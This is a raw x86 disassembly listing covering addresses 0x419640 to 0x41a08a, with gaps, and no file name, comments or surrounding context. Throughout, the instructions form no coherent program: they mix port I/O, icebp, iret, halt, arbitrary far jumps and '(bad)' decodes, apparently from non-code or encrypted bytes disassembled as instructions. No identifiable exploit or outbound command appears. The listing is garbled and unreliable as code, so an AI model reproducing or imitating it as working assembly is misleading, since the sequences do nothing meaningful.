  419640:	mov    dh,0x64
  419642:	xchg   esi,eax
  419643:	inc    ebx
  419644:	les    ebx,FWORD PTR [ebx]
  419646:	rcl    edx,1
  419648:	dec    edx
  419649:	xor    dl,BYTE PTR [ecx-0x329bda4d]
  41964f:	pusha  
  419650:	pop    esi
  419651:	inc    esp
  419652:	fsubr  st(6),st
  419654:	or     eax,0x5036bc1e
  419659:	mov    dl,0xcf
  41965b:	jns    0x4195e2
  41965d:	jne    0x4195e0
  41965f:	jge    0x4196db
  419661:	std    
  419662:	les    ecx,FWORD PTR [esi+esi*8-0x10f1c776]
  419669:	jle    0x41965f
  41966b:	inc    ecx
  41966c:	out    dx,al
  41966d:	mov    edi,0xeead12ae
  419672:	jne    0x419695
  419674:	mov    cl,0xe6
  419676:	jecxz  0x41967a
  419678:	inc    edi
  419679:	in     al,dx
  41967a:	in     eax,dx
  41967b:	fnstsw WORD PTR [ebp+0x2881955e]
  419681:	mov    eax,ds:0x4d4e28b6
  419686:	jle    0x41965c
  419688:	xchg   esp,eax
  419689:	inc    esi
  41968a:	mov    esi,0xbd00a45a
  41968f:	push   esi
  419690:	or     al,0xe0
  419692:	mov    al,0xe6
  419694:	iret   
  419695:	xchg   esi,eax
  419696:	xor    eax,0xcdce4401
  41969b:	pop    es
  41969c:	xchg   DWORD PTR [ecx+0x42314b83],esp
  4196a2:	xchg   esi,eax
  4196a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196a4:	push   ecx
  4196a5:	mov    DWORD PTR [eax],ebx
  4196a7:	dec    esi
  4196a8:	xchg   ebx,eax
  4196a9:	stos   DWORD PTR es:[edi],eax
  4196aa:	xor    bh,BYTE PTR [esi-0x31d5b687]
  4196b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b1:	cmp    bh,BYTE PTR [edx+0x62]
  4196b4:	mov    esi,0x0
	...
  419715:	add    BYTE PTR [ebx-0x29a8ec1],dh
  41971b:	outs   dx,DWORD PTR ds:[esi]
  41971c:	mov    bh,0xff
  41971e:	inc    ebp
  41971f:	loop   0x419766
  419721:	dec    esp
  419722:	inc    BYTE PTR [esp+ecx*4+0x77]
  419726:	mov    cl,BYTE PTR [ebx]
  419728:	add    DWORD PTR [eax],eax
  41972a:	pop    es
  41972b:	add    DWORD PTR [eax],eax
  41972d:	add    BYTE PTR [ebp-0x3d],bh
  419730:	mov    ds:0x6346cce3,eax
  419735:	xor    DWORD PTR [eax+0x403b6647],0x686fdce5
  41973f:	pop    edi
  419740:	(bad)  
  419741:	sbb    DWORD PTR [edx+0x74],edx
  419744:	retf   
  419745:	int3   
  419746:	and    eax,0x34f91d05
  41974b:	lea    esi,[ebx+0x3b]
  41974e:	and    dh,0x9
  419751:	fild   QWORD PTR [edx]
  419753:	sbb    al,0x43
  419755:	jecxz  0x41978c
  419757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419758:	mov    bl,0x98
  41975a:	into   
  41975b:	cmp    eax,0xe6f32259
  419760:	sar    DWORD PTR [esi-0x2b727303],1
  419766:	jl     0x419764
  419768:	pop    edi
  419769:	xor    DWORD PTR [eax+eax*8-0x10],0x2e
  41976e:	inc    edx
  41976f:	es jle 0x4197d0
  419772:	out    0x5a,eax
  419774:	or     eax,DWORD PTR [ecx+0x63ef79f8]
  41977a:	ds xchg ecx,eax
  41977c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41977d:	adc    dl,BYTE PTR [edx+0x1eab4f32]
  419783:	sar    DWORD PTR [edx+0x3d],cl
  419786:	push   ecx
  419787:	add    DWORD PTR [esi+0x20],eax
  41978a:	mov    DWORD PTR [edx+0x2b],ecx
  41978d:	sub    eax,0x891b5a11
  419792:	hlt    
  419793:	xchg   esp,eax
  419794:	sti    
  419795:	cwde   
  419796:	loope  0x419727
  419798:	in     eax,0x86
  41979a:	xchg   ebx,eax
  41979b:	cmp    al,0xfa
  41979d:	mov    esp,DWORD PTR [esi-0x69109b8d]
  4197a3:	and    cl,0x5f
  4197a6:	jno    0x419815
  4197a8:	xchg   ecx,eax
  4197a9:	jg     0x4197ba
  4197ab:	mov    ah,0xa8
  4197ad:	shl    BYTE PTR [edi+ecx*1+0x422449b8],cl
  4197b4:	(bad)  
  4197b5:	repz and DWORD PTR [edx],0xfc048ad1
  4197bc:	rcl    DWORD PTR [ebp-0x1d],1
  4197bf:	(bad)  
  4197c0:	or     BYTE PTR [ecx-0x16],cl
  4197c3:	imul   cl
  4197c5:	and    eax,DWORD PTR [edi+0x57ec2f46]
  4197cb:	dec    esi
  4197cc:	sbb    BYTE PTR [edi],bl
  4197ce:	test   BYTE PTR [eax+0x34],bl
  4197d1:	xor    eax,0xe4ece922
  4197d6:	rcl    DWORD PTR [ecx-0x26],0x7b
  4197da:	cmp    bh,ch
  4197dc:	or     eax,0x8a669522
  4197e1:	lea    esi,[edx]
  4197e3:	add    eax,0x7f7182ef
  4197e8:	pop    ds
  4197e9:	loope  0x41979a
  4197eb:	dec    esp
  4197ec:	ror    DWORD PTR [esi+ecx*8+0x7d],cl
  4197f0:	sbb    eax,0x4936f4a8
  4197f5:	pusha  
  4197f6:	icebp  
  4197f7:	and    al,0x54
  4197f9:	pop    ds
  4197fa:	inc    ecx
  4197fb:	pop    edx
  4197fc:	mov    edi,0xaacc1f4a
  419801:	jbe    0x41978d
  419803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419804:	icebp  
  419805:	inc    ebx
  419806:	punpckldq mm5,DWORD PTR [esi]
  419809:	xchg   edi,eax
  41980a:	mov    edx,0x5cba550d
  41980f:	loope  0x419800
  419811:	sub    ebp,DWORD PTR cs:[esi]
  419814:	icebp  
  419815:	test   al,0xf9
  419817:	push   esp
  419818:	stos   BYTE PTR es:[edi],al
  419819:	(bad)  
  41981a:	sahf   
  41981b:	shl    BYTE PTR [ebp+0x273dd327],cl
  419821:	dec    ecx
  419822:	pop    es
  419823:	adc    ch,BYTE PTR [ebp+0x5a1ead53]
  419829:	fsub   QWORD PTR [esi-0x6f11bfee]
  41982f:	popf   
  419830:	mov    ecx,0x3ab88a4a
	...
  419895:	add    BYTE PTR [edx-0x201eb8e7],al
  41989b:	jmp    DWORD PTR [esi-0x4a285f85]
  4198a1:	fcmovu st,st(3)
  4198a3:	push   ebp
  4198a4:	mov    al,0xdf
  4198a6:	xchg   ecx,eax
  4198a7:	or     al,0x1
  4198a9:	add    BYTE PTR [edi],al
  4198ab:	add    DWORD PTR [eax],eax
  4198ad:	add    BYTE PTR [esi-0x7d],bl
  4198b0:	cmc    
  4198b1:	jmp    0x808f:0x6291c08d
  4198b8:	mov    eax,ds:0x56ac14cb
  4198bd:	sbb    eax,0x805727e3
  4198c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198c3:	inc    eax
  4198c4:	out    dx,al
  4198c5:	int    0xe4
  4198c7:	in     eax,0x14
  4198c9:	and    al,ah
  4198cb:	or     al,0x31
  4198cd:	mov    eax,ds:0x2f924869
  4198d2:	push   cs
  4198d3:	xchg   esp,eax
  4198d4:	xchg   ecx,eax
  4198d5:	or     ebx,DWORD PTR [ebp+esi*8+0x180b1d40]
  4198dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198dd:	or     DWORD PTR [ebx-0x62f0432d],ecx
  4198e3:	stos   BYTE PTR es:[edi],al
  4198e4:	arpl   WORD PTR [esi-0x11e5e356],sp
  4198ea:	mov    BYTE PTR [esi+esi*2+0x3bfce8a0],dl
  4198f1:	cmp    eax,0x43b2f81c
  4198f6:	and    eax,DWORD PTR [edi+0x70]
  4198f9:	inc    edi
  4198fa:	push   0x5c
  4198fc:	push   0x941fed6a
  419901:	jmp    0x6ccc1183
  419906:	xchg   ebx,eax
  419907:	xchg   ebx,eax
  419908:	sbb    BYTE PTR [edi+ebp*2],0xf6
  41990c:	ffree  st(2)
  41990e:	mov    ebx,0xcda66abe
  419913:	inc    ebx
  419914:	pusha  
  419915:	sub    ebp,DWORD PTR [ebx+0x2c]
  419918:	sub    DWORD PTR [ebp+0xfba8f0f],0x79432b50
  419922:	sti    
  419923:	jae    0x419913
  419925:	mov    esp,0x3fafa1c0
  41992a:	(bad)  
  41992b:	mov    ch,0x2e
  41992d:	(bad)  
  41992e:	ror    DWORD PTR [ecx],cl
  419930:	dec    eax
  419931:	sub    ah,BYTE PTR cs:[eax+0x75]
  419935:	xchg   DWORD PTR [esi-0x270717e2],esi
  41993b:	and    ah,al
  41993d:	test   eax,0x46a84f1b
  419942:	sub    dl,0x7b
  419945:	xchg   edi,eax
  419946:	stos   DWORD PTR es:[edi],eax
  419947:	add    dh,BYTE PTR ds:0x3742cff2
  41994d:	sbb    BYTE PTR [edx+0x47],ch
  419950:	xor    edi,ebp
  419952:	adc    BYTE PTR [edi-0x60388000],dh
  419958:	jmp    0x41997c
  41995a:	inc    ecx
  41995b:	das    
  41995c:	jmp    0x4199bb
  41995e:	xchg   DWORD PTR [ebx+eax*4+0x1],eax
  419962:	jbe    0x4199d6
  419964:	aad    0x3a
  419966:	scas   al,BYTE PTR es:[edi]
  419967:	push   edx
  419968:	xchg   BYTE PTR [esi-0x60a4607c],bl
  41996e:	fnstcw WORD PTR [esp+ebp*4]
  419971:	dec    BYTE PTR [ebx-0x53]
  419974:	xchg   esi,eax
  419975:	hlt    
  419976:	test   DWORD PTR [esi+0x40c21bb4],esi
  41997c:	mov    gs,esp
  41997e:	and    cl,ch
  419980:	dec    ebp
  419981:	add    eax,0x4a5d2142
  419986:	xor    DWORD PTR [edx+0x5500b3b5],ebp
  41998c:	and    eax,0x96b973ec
  419991:	test   eax,0xbb69b820
  419996:	adc    DWORD PTR [ebx+edx*8+0xa981c5c],eax
  41999d:	jbe    0x4199d1
  41999f:	cmc    
  4199a0:	addr16 pop ebp
  4199a2:	ret    0xa4a6
  4199a5:	test   edx,esp
  4199a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199a8:	mov    ebp,0x454a3fc4
  4199ad:	jg     0x419932
  4199af:	neg    DWORD PTR ds:[esi-0x1]
  4199b3:	jle    0x419944
	...
  419a15:	add    BYTE PTR [ebx],dh
  419a17:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a1d:	neg    DWORD PTR [ecx+0x16]
  419a20:	mov    eax,ds:0xe2170609
  419a25:	das    
  419a26:	cwde   
  419a27:	or     eax,0x1070001
  419a2c:	add    BYTE PTR [eax],al
  419a2e:	xor    al,al
  419a30:	imul   edi,esp,0x92717fc2
  419a36:	shl    DWORD PTR [edi+0x24],cl
  419a39:	push   0x57
  419a3b:	mov    edx,0x4ed9c478
  419a40:	std    
  419a41:	sbb    eax,0x42d1d194
  419a46:	test   BYTE PTR [ecx+0xd],dl
  419a49:	and    ebx,DWORD PTR ds:0xf46aa90d
  419a4f:	dec    ecx
  419a50:	or     BYTE PTR [ecx-0xce68c8c],ch
  419a56:	cmp    BYTE PTR [esi+0x7637a1a5],0x81
  419a5d:	les    edi,FWORD PTR [edx-0x5a]
  419a60:	out    dx,al
  419a61:	fbstp  TBYTE PTR [edi-0x1]
  419a64:	ficom  DWORD PTR [edi]
  419a66:	sub    DWORD PTR [edx],eax
  419a68:	inc    esi
  419a69:	pop    ss
  419a6a:	jo     0x419a28
  419a6c:	mov    eax,0x39168253
  419a71:	mov    al,ds:0x31d134de
  419a76:	jmp    0x4484:0x75ed
  419a7c:	ja     0x419a93
  419a7e:	dec    esi
  419a7f:	(bad)  
  419a80:	sti    
  419a81:	or     dl,BYTE PTR [edi]
  419a83:	ja     0x419a75
  419a85:	sbb    ebp,DWORD PTR [esi]
  419a87:	imul   edi,DWORD PTR [edi+eiz*8],0xffffffcd
  419a8b:	stc    
  419a8c:	pop    ss
  419a8d:	add    al,0xf1
  419a8f:	mov    ebx,0xcc3271f0
  419a94:	outs   dx,BYTE PTR ds:[esi]
  419a95:	outs   dx,BYTE PTR ds:[esi]
  419a96:	std    
  419a97:	pop    esi
  419a98:	push   eax
  419a99:	mov    bl,0xb0
  419a9b:	imul   ebp,DWORD PTR ds:0x34238604,0xc61ba151
  419aa5:	dec    eax
  419aa6:	pusha  
  419aa7:	and    eax,0xd6f75a20
  419aac:	fidivr DWORD PTR [ebx]
  419aae:	xchg   ecx,eax
  419aaf:	xlat   BYTE PTR ds:[ebx]
  419ab0:	imul   edx,edx,0x7700783a
  419ab6:	test   eax,0xafab6fd4
  419abb:	dec    esi
  419abc:	and    eax,0x8b464af8
  419ac1:	cmp    eax,0xb02ed391
  419ac6:	mov    eax,0xaa921c2d
  419acb:	sar    DWORD PTR [esi+0x268ee1d1],cl
  419ad1:	pop    eax
  419ad2:	or     edi,eax
  419ad4:	sbb    esi,DWORD PTR [ecx-0x13]
  419ad7:	mov    dh,0xeb
  419ad9:	outs   dx,DWORD PTR ds:[esi]
  419ada:	adc    bl,BYTE PTR [edi-0x9]
  419add:	out    dx,al
  419ade:	pop    eax
  419adf:	jns    0x419a71
  419ae1:	pop    esp
  419ae2:	stc    
  419ae3:	push   esi
  419ae4:	cmp    ax,0xc3d
  419ae8:	icebp  
  419ae9:	out    dx,al
  419aea:	ror    BYTE PTR [esi-0x352ee543],0x5d
  419af1:	in     al,dx
  419af2:	stos   BYTE PTR es:[edi],al
  419af3:	int    0x2c
  419af5:	les    edi,FWORD PTR [edi]
  419af7:	mov    ch,al
  419af9:	dec    esi
  419afa:	mov    eax,ds:0x21caed5b
  419aff:	adc    DWORD PTR [edi+0x5a],0x7f15350e
  419b06:	dec    ecx
  419b07:	jecxz  0x419b40
  419b09:	mov    esi,DWORD PTR [esi-0x4a8a0a4b]
  419b0f:	mov    ds:0x63df46f,al
  419b14:	les    ecx,FWORD PTR [esi-0x6e0b0cef]
  419b1a:	xor    BYTE PTR [ebx-0x132924a1],ah
  419b20:	pop    eax
  419b21:	cmp    DWORD PTR [esi-0xe],ebx
  419b24:	dec    esi
  419b25:	jge    0x419ad3
  419b27:	pop    ebp
  419b28:	out    0xe9,al
  419b2a:	sub    al,0x24
  419b2c:	mov    cl,0x7c
  419b2e:	jnp    0x419b00
  419b30:	fdivr  DWORD PTR [ebx+0xc0533]
	...
  419b96:	dec    edx
  419b97:	(bad)  
  419b98:	cli    
  419b99:	inc    edi
  419b9a:	(bad)  
  419b9b:	jg     0x419b9c
  419b9d:	int    0xb7
  419b9f:	cs aam 0x47
  419ba2:	ds pop es
  419ba4:	dec    ebx
  419ba5:	repz lahf 
  419ba7:	push   cs
  419ba8:	add    DWORD PTR [eax],eax
  419baa:	pop    es
  419bab:	add    DWORD PTR [eax],eax
  419bad:	add    BYTE PTR [edi+ecx*8-0x37],ch
  419bb1:	fwait
  419bb2:	sahf   
  419bb3:	xor    BYTE PTR [esi],0xd0
  419bb6:	mov    eax,ds:0xb2e1264d
  419bbb:	mov    edi,0xaaa64fd4
  419bc0:	in     eax,0xd0
  419bc2:	or     DWORD PTR [edi-0x4d],esp
  419bc5:	pop    edx
  419bc6:	sbb    al,0x8
  419bc8:	jp     0x419bab
  419bca:	jle    0x419c35
  419bcc:	and    DWORD PTR [esi-0x7c6c0d77],ebx
  419bd2:	sub    eax,0xe1d86d74
  419bd7:	and    al,0xe2
  419bd9:	xor    dh,cl
  419bdb:	pop    ebp
  419bdc:	dec    edi
  419bdd:	jmp    0x419c29
  419bdf:	clc    
  419be0:	sbb    al,0x36
  419be2:	cmp    BYTE PTR [esi+0x6b457606],cl
  419be8:	add    esp,DWORD PTR ds:0xabdd0541
  419bee:	and    edx,DWORD PTR [ebp+0x6f]
  419bf1:	mov    ch,0x20
  419bf3:	(bad)  
  419bf5:	sub    al,0x51
  419bf7:	sbb    al,0xca
  419bf9:	or     ebx,DWORD PTR [esi+0x3d]
  419bfc:	(bad)  
  419bfd:	push   edx
  419bfe:	and    eax,0x9f3fc66
  419c03:	xchg   edx,eax
  419c04:	(bad)  
  419c05:	in     al,0xac
  419c07:	hlt    
  419c08:	jb     0x419b98
  419c0a:	mov    bl,0x9d
  419c0c:	(bad)  
  419c0d:	jns    0x419c7c
  419c0f:	or     al,0xbf
  419c11:	(bad)  
  419c12:	scas   eax,DWORD PTR es:[edi]
  419c13:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c15:	add    dh,BYTE PTR [edx+0x7774de]
  419c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c1c:	mov    edx,0x8b5f61e5
  419c21:	mov    dh,0x6d
  419c23:	cdq    
  419c24:	outs   dx,DWORD PTR es:[esi]
  419c26:	out    dx,eax
  419c27:	mov    gs,WORD PTR [eax-0x2e79846d]
  419c2d:	inc    ecx
  419c2e:	fs inc eax
  419c30:	inc    esp
  419c31:	icebp  
  419c32:	test   al,0x87
  419c34:	cld    
  419c35:	mov    BYTE PTR [ecx*8-0x3befc2df],ah
  419c3c:	js     0x419ca0
  419c3e:	adc    DWORD PTR [edi+0x14],edi
  419c41:	leave  
  419c42:	push   ss
  419c43:	popa   
  419c44:	xchg   BYTE PTR [edx],bl
  419c46:	jmp    0x419be1
  419c48:	pop    esi
  419c49:	es retf 
  419c4b:	dec    ebx
  419c4c:	cmp    esi,DWORD PTR [ecx+0x20]
  419c4f:	scas   al,BYTE PTR es:[edi]
  419c50:	pmullw mm0,QWORD PTR [edx]
  419c53:	pusha  
  419c54:	jg     0x419cb3
  419c56:	retf   0xb035
  419c59:	icebp  
  419c5a:	pop    es
  419c5b:	jmp    0xc1dcbb31
  419c60:	mov    cl,0xd4
  419c62:	push   edx
  419c63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c64:	sub    al,0x70
  419c66:	cmc    
  419c67:	sub    BYTE PTR [eax-0x216d05],cl
  419c6d:	pop    ds
  419c6e:	mov    esp,0xd8ff4816
  419c73:	and    edi,DWORD PTR [eax-0x2b9a3f0]
  419c79:	mov    al,BYTE PTR [edi]
  419c7b:	xor    DWORD PTR [edi+0x1],0xcda1da08
  419c82:	sub    BYTE PTR [esi+0x19],dh
  419c85:	pop    ebp
  419c86:	xchg   ebp,eax
  419c87:	mov    al,ds:0x8f641c34
  419c8c:	xor    ebx,DWORD PTR [ecx]
  419c8e:	xor    DWORD PTR [edx+0xc],0x65650b06
  419c95:	jbe    0x419cff
  419c97:	into   
  419c98:	call   DWORD PTR [ebx+0x42]
  419c9b:	sub    dl,al
  419c9d:	push   ecx
  419c9e:	in     eax,0xf8
  419ca0:	scas   eax,DWORD PTR es:[edi]
  419ca1:	jnp    0x419cec
  419ca3:	xor    ebp,DWORD PTR [edx+0x7afc1af2]
  419ca9:	or     bh,dl
  419cab:	fisttp WORD PTR [eax+0x3f]
  419cae:	popa   
  419caf:	cwde   
  419cb0:	into   
  419cb1:	cmp    DWORD PTR [edi+0x77],esi
  419cb4:	dec    esi
	...
  419d15:	add    al,dh
  419d17:	xchg   edi,eax
  419d18:	std    
  419d19:	cmp    al,0xff
  419d1b:	jle    0x419d0e
  419d1d:	fistp  WORD PTR [eax]
  419d1f:	push   0x61739c45
  419d24:	jnp    0x419cc6
  419d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d27:	sgdtd  [eax]
  419d2a:	pop    es
  419d2b:	add    DWORD PTR [eax],eax
  419d2d:	add    BYTE PTR [edx+0x3da34d21],bl
  419d33:	(bad)  
  419d34:	mov    bl,0x1
  419d36:	mov    dh,BYTE PTR [edx+0x34]
  419d39:	xor    eax,0x1eb6bbac
  419d3e:	js     0x419d81
  419d40:	mov    ebx,0x4463f4c0
  419d45:	push   ebp
  419d46:	and    ebx,DWORD PTR [ebx-0x20]
  419d49:	jle    0x419d04
  419d4b:	add    edx,DWORD PTR [ebp-0x1b]
  419d4e:	add    eax,0x6e9be30
  419d53:	cmp    esi,DWORD PTR [ecx-0xcfc23ed]
  419d59:	xchg   ebx,eax
  419d5a:	test   BYTE PTR [esi],0x92
  419d5d:	pop    ebp
  419d5f:	jmp    0xe2893b94
  419d64:	loopne 0x419da1
  419d66:	adc    eax,0xe1551d16
  419d6b:	ins    DWORD PTR es:[edi],dx
  419d6c:	outs   dx,BYTE PTR ds:[esi]
  419d6d:	retf   
  419d6e:	stos   BYTE PTR es:[edi],al
  419d6f:	mov    eax,0x55b00e56
  419d74:	aaa    
  419d75:	js     0x419dc0
  419d77:	scas   al,BYTE PTR es:[edi]
  419d78:	imul   ebx,DWORD PTR [ecx-0x26],0xdf5edff
  419d7f:	adc    edx,DWORD PTR [ebx+0x11]
  419d82:	cmp    al,0xdf
  419d84:	dec    edi
  419d85:	sub    BYTE PTR [edi],dl
  419d87:	add    eax,0x80abbecf
  419d8c:	xchg   esi,eax
  419d8d:	call   0x6e09:0x5e558820
  419d94:	loopne 0x419dfb
  419d96:	and    BYTE PTR [edx],0x22
  419d99:	cmp    eax,0x84eb278
  419d9e:	sbb    ecx,DWORD PTR [ebx]
  419da0:	les    edi,FWORD PTR [ecx-0x7168c3e7]
  419da6:	pop    edi
  419da7:	(bad)
  419daa:	xlat   BYTE PTR ds:[ebx]
  419dab:	or     eax,0x10257346
  419db0:	jo     0x419db2
  419db2:	or     eax,0x14ef5ffe
  419db7:	mov    ds:0x3518251b,eax
  419dbc:	loope  0x419de2
  419dbe:	aaa    
  419dbf:	test   al,0xa3
  419dc1:	sti    
  419dc2:	lds    esi,FWORD PTR [ecx]
  419dc4:	xor    eax,DWORD PTR [eax]
  419dc6:	pop    edi
  419dc7:	dec    ebx
  419dc8:	push   ds
  419dc9:	ret    
  419dca:	fsubr  QWORD PTR [edi-0xa]
  419dcd:	ret    0x333d
  419dd0:	add    esp,DWORD PTR [esi+0x10]
  419dd3:	inc    edi
  419dd4:	pushf  
  419dd5:	cmp    bl,BYTE PTR [ecx+0x10]
  419dd8:	je     0x419e50
  419dda:	add    al,0x20
  419ddc:	fwait
  419ddd:	pop    ss
  419dde:	dec    edx
  419ddf:	(bad)  
  419de0:	out    dx,eax
  419de1:	or     ecx,DWORD PTR [ebx]
  419de3:	data16 in al,dx
  419de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419de6:	push   edi
  419de7:	inc    esp
  419de8:	ficomp WORD PTR [bp+si]
  419deb:	dec    eax
  419dec:	pop    esi
  419ded:	xor    al,0xb0
  419def:	lahf   
  419df0:	push   es
  419df1:	pop    edx
  419df2:	(bad)  
  419df3:	fwait
  419df4:	or     al,ch
  419df6:	adc    esp,0xffffffd5
  419df9:	stos   DWORD PTR es:[edi],eax
  419dfa:	mov    eax,ds:0x6f842711
  419dff:	ins    BYTE PTR es:[edi],dx
  419e00:	push   ecx
  419e01:	sar    BYTE PTR [esi],0xeb
  419e04:	cld    
  419e05:	daa    
  419e06:	mov    ds:0xa39d02ee,al
  419e0b:	lods   eax,DWORD PTR ds:[esi]
  419e0c:	outs   dx,BYTE PTR ds:[esi]
  419e0d:	jecxz  0x419db9
  419e0f:	jle    0x419e13
  419e11:	fiadd  WORD PTR [ebp+0x12]
  419e14:	mov    ah,0xbe
  419e16:	xor    DWORD PTR [ebp+0x77],ecx
  419e19:	les    edi,FWORD PTR [ebx-0x9d87a74]
  419e1f:	jecxz  0x419e21
  419e21:	jb     0x419e97
  419e23:	inc    edi
  419e24:	dec    ecx
  419e25:	mov    ds:0xea06adaf,al
  419e2b:	into   
  419e2c:	add    al,0x9a
  419e2e:	out    0xd2,eax
  419e30:	data16 ds jge 0x419db6
  419e34:	rol    BYTE PTR [eax],1
	...
  419e96:	xchg   eax,ebx
  419e98:	pop    ss
  419e99:	lds    ebx,FWORD PTR [edi-0x31]
  419e9c:	xlat   BYTE PTR ds:[ebx]
  419e9d:	fimul  DWORD PTR [eax+0x5e50c5a0]
  419ea3:	xchg   DWORD PTR ds:0x110adaa,eax
  419ea9:	add    BYTE PTR [edi],al
  419eab:	add    DWORD PTR [eax],eax
  419ead:	add    ah,bl
  419eaf:	ror    edi,1
  419eb1:	in     eax,0xf2
  419eb3:	cmp    ebp,edx
  419eb5:	dec    edx
  419eb6:	ja     0x419e40
  419eb8:	in     al,dx
  419eb9:	out    dx,eax
  419eba:	call   0xe853:0x975dd4ea
  419ec1:	xchg   ebp,eax
  419ec2:	add    eax,0x107f6048
  419ec7:	adc    eax,0xac42765f
  419ecc:	test   al,0xcb
  419ece:	add    al,0x4a
  419ed0:	mov    esi,0x9de30025
  419ed5:	inc    ebp
  419ed6:	mov    ds:0xf62b08eb,eax
  419edb:	aas    
  419edc:	imul   eax,DWORD PTR [esi-0x25],0x27
  419ee0:	or     eax,ebx
  419ee2:	add    ah,BYTE PTR ds:0x8d0ffe0c
  419ee8:	jge    0x419e9c
  419eea:	out    0xaf,al
  419eec:	mov    al,0xc2
  419eee:	add    DWORD PTR [edi+0x6e],eax
  419ef1:	xor    BYTE PTR [esi+0x24],0x97
  419ef5:	push   ss
  419ef6:	adc    bh,BYTE PTR [esi-0x16]
  419ef9:	sub    al,0xaa
  419efb:	xor    cl,BYTE PTR [edx]
  419efd:	int3   
  419efe:	sbb    eax,DWORD PTR [edi]
  419f00:	ret    
  419f01:	cmp    al,0xc6
  419f03:	fbld   TBYTE PTR [ebx]
  419f05:	pop    ebx
  419f06:	cmp    BYTE PTR [ebp-0x2e],ch
  419f09:	shl    DWORD PTR [ebx-0x7f6c3253],0xf1
  419f10:	gs loop 0x419f91
  419f13:	jnp    0x419e9b
  419f15:	cmp    edx,DWORD PTR [esi-0x11]
  419f18:	jmp    0xd25f:0xd4ce0da4
  419f1f:	mov    al,0xbe
  419f21:	add    BYTE PTR [ecx-0x7f54be39],0x22
  419f28:	push   edx
  419f29:	sub    edx,DWORD PTR [eax-0x20473e02]
  419f2f:	jo     0x419f59
  419f31:	iret   
  419f32:	scas   al,BYTE PTR es:[edi]
  419f33:	jecxz  0x419f9b
  419f35:	cld    
  419f36:	jns    0x419ec1
  419f38:	aaa    
  419f39:	xor    DWORD PTR [ecx+edx*8-0x53f27855],edi
  419f40:	or     DWORD PTR ds:0x211d6951,eax
  419f46:	fidivr WORD PTR [edi+0x7edefcbf]
  419f4c:	into   
  419f4d:	push   0xffffffe1
  419f4f:	mov    WORD PTR [ebx],es
  419f51:	loope  0x419f7f
  419f53:	ins    BYTE PTR es:[edi],dx
  419f54:	xchg   ebp,eax
  419f55:	fwait
  419f56:	sbb    DWORD PTR [edx],ebp
  419f58:	icebp  
  419f59:	xchg   edx,eax
  419f5a:	dec    esi
  419f5b:	adc    esi,0x8edf4940
  419f61:	or     BYTE PTR [eax+0x2354df8e],bl
  419f67:	adc    DWORD PTR [eax+esi*2],0xffffffcc
  419f6b:	mov    ah,0xa
  419f6d:	out    0x5,al
  419f6f:	jmp    DWORD PTR [eax+0x4c4f76cd]
  419f75:	ror    BYTE PTR [esi+esi*8+0x60fb7115],1
  419f7c:	jo     0x419f3e
  419f7e:	fstp   TBYTE PTR ds:0x897d47c1
  419f84:	mov    ds:0x47f0425d,al
  419f89:	push   ebp
  419f8a:	pop    ecx
  419f8b:	xor    bh,bl
  419f8d:	xor    dl,ah
  419f8f:	scas   al,BYTE PTR es:[edi]
  419f90:	mov    cl,0xe4
  419f92:	dec    edx
  419f93:	mov    edx,0x1eccb953
  419f98:	jg     0x419f7f
  419f9a:	ss lock aaa 
  419f9d:	(bad)  
  419f9e:	in     al,dx
  419f9f:	jp     0x419fa2
  419fa1:	shl    BYTE PTR [eax+0x71ad9938],1
  419fa7:	daa    
  419fa8:	pop    eax
  419fa9:	inc    ecx
  419faa:	inc    esp
  419fab:	fdiv   DWORD PTR ds:0x12e20b2d
  419fb1:	fcom   QWORD PTR [ebp-0x26]
  419fb4:	int3   
	...
  41a015:	add    BYTE PTR [esi-0x15],cl
  41a018:	sub    cl,BYTE PTR [esi-0x51]
  41a01b:	iret   
  41a01c:	outs   dx,BYTE PTR ds:[esi]
  41a01d:	jmp    0x41a015
  41a01f:	in     al,dx
  41a020:	pop    ds
  41a021:	outs   dx,DWORD PTR ds:[esi]
  41a022:	imul   esi,DWORD PTR [edi],0x11b43418
  41a028:	add    DWORD PTR [eax],eax
  41a02a:	pop    es
  41a02b:	add    DWORD PTR [eax],eax
  41a02d:	add    BYTE PTR [ebx-0x80],bh
  41a030:	pop    edx
  41a031:	outs   dx,BYTE PTR ds:[esi]
  41a032:	cmp    al,BYTE PTR [esi]
  41a034:	add    eax,0xb6a86c2f
  41a039:	(bad)  
  41a03a:	push   ebx
  41a03b:	std    
  41a03c:	cmp    eax,DWORD PTR [ebx-0x36]
  41a03f:	mov    dl,0x4a
  41a041:	pop    ss
  41a042:	push   cs
  41a043:	aas    
  41a044:	mov    BYTE PTR [edx],ch
  41a046:	sbb    eax,0x5123d2e0
  41a04b:	rol    BYTE PTR [eax-0x4447793f],1
  41a051:	minps  xmm1,XMMWORD PTR [edi-0x4]
  41a055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a056:	fldcw  WORD PTR [ebx]
  41a058:	dec    esp
  41a059:	jmp    0x688682b0
  41a05e:	cwde   
  41a05f:	mov    ds:0x6280a67b,eax
  41a064:	mov    al,0x25
  41a066:	and    eax,0x4c096e9f
  41a06b:	hlt    
  41a06c:	xlat   BYTE PTR ds:[ebx]
  41a06d:	faddp  st(0),st
  41a06f:	xchg   edi,eax
  41a070:	push   esp
  41a071:	sub    dh,BYTE PTR [edx-0x32]
  41a074:	sbb    al,0xa0
  41a076:	test   eax,0x4ba0bea3
  41a07b:	jecxz  0x41a029
  41a07d:	sbb    ah,ch
  41a07f:	gs push eax
  41a081:	repnz xchg edi,eax
  41a083:	inc    edx
  41a084:	mov    cl,BYTE PTR [ecx]
  41a086:	pop    di
  41a088:	push   0xffffffd6
  41a08a:	mov    ecx,0xd3d6dc93
